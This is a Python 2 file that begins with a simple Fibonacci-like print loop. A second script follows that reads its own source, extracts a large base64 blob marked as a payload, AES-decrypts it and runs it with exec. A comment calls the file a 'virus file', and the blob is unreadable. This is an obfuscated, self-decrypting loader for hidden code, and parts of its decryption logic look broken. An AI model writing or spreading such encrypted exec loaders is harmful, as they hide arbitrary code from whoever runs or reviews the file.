parents, babies = (1, 1)
while babies < 100:
    print 'This generation has {0} babies'.format(babies)
    parents, babies = (babies, parents + babies)

######################################################## First script python
# coding=utf-8
# Start Unencrypted
import os
import __main__
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES


# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)

   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
#print e
exec e
sys.exit('Good job!')
# End Unencrypted
# Start payload
#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
# End payload